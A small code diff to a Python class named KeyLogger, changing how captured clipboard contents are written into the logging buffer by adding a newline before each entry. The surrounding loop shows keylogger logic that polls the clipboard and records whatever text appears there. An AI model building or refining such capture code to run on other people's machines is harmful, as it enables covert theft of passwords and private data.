@@ -303,7 +303,8 @@ class KeyLogger:
                         # New content in clipboard
                         self.last_clipboard_content = current_clipboard
                         self.flush_special_key_count()
-                        self.write_to_buffer(f"{{clipboard}} {current_clipboard}\n")
+                        # Add newlines before and after clipboard content for better readability
+                        self.write_to_buffer(f"\n{{clipboard}} {current_clipboard}\n")
                         logger.debug(f"Clipboard changed: {len(current_clipboard)} chars")
                 
                 time.sleep(self.clipboard_check_interval)
